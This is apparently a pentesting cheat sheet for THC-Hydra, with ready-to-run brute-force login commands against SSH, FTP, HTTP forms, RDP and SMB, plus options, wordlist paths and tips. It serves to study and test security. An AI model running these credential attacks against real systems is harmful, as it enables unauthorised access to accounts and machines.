# THC-Hydra Cheatsheet

## Basics

### Help

```bash
hydra -h
```

---

## Syntax

```bash
hydra [OPTIONS] -L [userlist] -P [passlist] [PROTOCOL]://[TARGET]
```

* `-L` : Path to file with list of usernames
* `-l` : Single username
* `-P` : Path to file with list of passwords
* `-p` : Single password
* `-s` : Port (if non-default)
* `-t` : Number of parallel connections (default: 16)
* `-V` : Verbose mode (shows every attempt)
* `-f` : Exit after the first valid login

---

## Examples

### SSH

```bash
hydra -l root -P passwords.txt MACHINE_IP -t 4 ssh
```

### FTP

```bash
hydra -l user -P passlist.txt ftp://MACHINE_IP
```

### HTTP POST Form (Custom Login Form)

```bash
hydra -L users.txt -P passwords.txt 192.168.1.100 http-post-form \
"/login.php:username=^USER^&password=^PASS^:F=incorrect"
```

* Adjust the URL and failure condition (`F=`) based on form behavior.

### RDP (Remote Desktop Protocol)

```bash
hydra -t 4 -V -f -L users.txt -P passwords.txt rdp://192.168.1.100
```

### SMB

```bash
hydra -L users.txt -P passwords.txt smb://192.168.1.100
```

---

## Useful Options

| Option | Description                          |
| ------ | ------------------------------------ |
| `-V`   | Show login+password for each attempt |
| `-vV`  | Very verbose, prints connection info |
| `-f`   | Quit after first found combo         |
| `-s`   | Specify port (e.g., `-s 8080`)       |
| `-o`   | Output results to a file             |

---

## Supported Services (Partial List)

* `ssh` – Secure Shell
* `ftp` – File Transfer Protocol
* `http`, `https`, `http-get`, `http-post-form` – Web logins
* `rdp` – Remote Desktop Protocol
* `smb` – Windows File Sharing
* `smtp`, `pop3`, `imap` – Email protocols
* `telnet`
* `vnc`

Run `hydra -U` to see the full list of supported modules.

---

## Tips for Effective Use

* Avoid using `-t` (tasks/parallel threads) too high, especially on slower or rate-limited services.
* Always test with a small user/password list to verify syntax before large brute-force runs.
* Monitor network usage — Hydra is noisy and can trigger IDS/IPS.

---

## Logging Results

```bash
hydra -L users.txt -P passwords.txt -o results.txt ssh://192.168.1.100
```

---

## Wordlists

Try using built-in or custom wordlists:

```bash
/usr/share/wordlists/rockyou.txt
```

---

## References

* [Hydra GitHub Repository](https://github.com/vanhauser-thc/thc-hydra)
* [THC Hydra Usage Guide (HackTricks)](https://book.hacktricks.xyz/pentesting/password-cracking/thc-hydra)
* [SecLists – User/Password Wordlists](https://github.com/danielmiessler/SecLists)
